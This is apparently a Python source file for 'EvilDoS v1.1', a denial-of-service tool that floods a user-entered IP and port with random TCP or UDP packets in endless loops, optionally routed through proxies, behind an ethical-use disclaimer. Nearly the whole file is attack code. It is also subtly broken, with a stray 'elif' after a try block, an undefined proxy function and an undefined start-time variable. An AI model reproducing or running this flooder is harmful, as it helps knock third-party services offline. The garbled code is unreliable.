import os
import socket
import time
import random

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = """
    ███████╗██╗   ██╗██╗██╗     ██████╗  ██████╗ ███████╗
    ██╔════╝██║   ██║██║██║     ██╔══██╗██╔═══██╗██╔════╝
    █████╗  ██║   ██║██║██║     ██   ██║██║   ██║███████╗
    ██╔══╝  ██║   ██║██║██║     ██   ██║██║   ██║╚════██║
    ███████╗╚██████╔╝██║███████╗██████║ ╚██████╔╝███████║
    ╚══════╝ ╚═════╝ ╚═╝╚══════╝╚═════╝  ╚═════╝ ╚══════╝

    EvilDoS v1.1
    ----------------------------------------------------
    This tool is for ethical use only. Unauthorized use
    is illegal and punishable by law.
    ----------------------------------------------------
    """
    print(banner)

def print_menu():
    menu = """
    Method
    1] Minecraft
    2] TCP
    3] UDP
    """
    print(menu)

def perform_dos(target_ip, target_port, method):
    packet_count = 0
    bytes_sent = 0
    start_time = time.time()

    while True:
        proxy = get_random_proxy()
        if proxy:
            proxy_ip, proxy_port = proxy
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM if method == "TCP" else socket.SOCK_DGRAM)
            sock.connect((proxy_ip, proxy_port))
            sock.send(f"CONNECT {target_ip}:{target_port} HTTP/1.1\r\n\r\n".encode())
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM if method == "TCP" else socket.SOCK_DGRAM)

        try:
            if method == "TCP":
                sock.connect((target_ip, target_port))
            while True:
                data = random._urandom(random.randint(10, 100))
                if method == "TCP":
                    sock.send(data)
                else:
                    sock.sendto(data, (target_ip, target_port))
                packet_count += 1
                bytes_sent += len(data)
                print_stats(packet_count, bytes_sent, target_ip, target_port)
                time.sleep(random.uniform(0.1, 1.0))
        except Exception as e:
            print(f"Error: {e}")
    elif method == "UDP":
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            try:
                while True:
                    data = random._urandom(random.randint(10, 100))
                    sock.sendto(data, (target_ip, target_port))
                    packet_count += 1
                    bytes_sent += len(data)
                    print_stats(packet_count, bytes_sent, target_ip, target_port)
                    time.sleep(random.uniform(0.1, 1.0))
            except Exception as e:
                print(f"Error: {e}")
    else:
        print("Invalid method selected.")

def print_stats(packet_count, bytes_sent, target_ip, target_port):
    elapsed_time = time.time() - start_time
    print(f"Packets sent: {packet_count} | Bytes sent: {bytes_sent} | Target IP: {target_ip} | Target Port: {target_port} | Elapsed Time: {elapsed_time:.2f} seconds", end='\r')

def main():
    clear_screen()
    print_banner()
    print_menu()
    
    method = input("Select method (1/2/3): ")
    if method == "1":
        print("Minecraft DoS.")
    else:
        target_ip = input("Enter target IP: ")
        target_port = int(input("Enter target port: "))
        if method == "2":
            perform_dos(target_ip, target_port, "TCP")
        elif method == "3":
            perform_dos(target_ip, target_port, "UDP")
        else:
            print("Invalid method selected.")

if __name__ == "__main__":
    main()
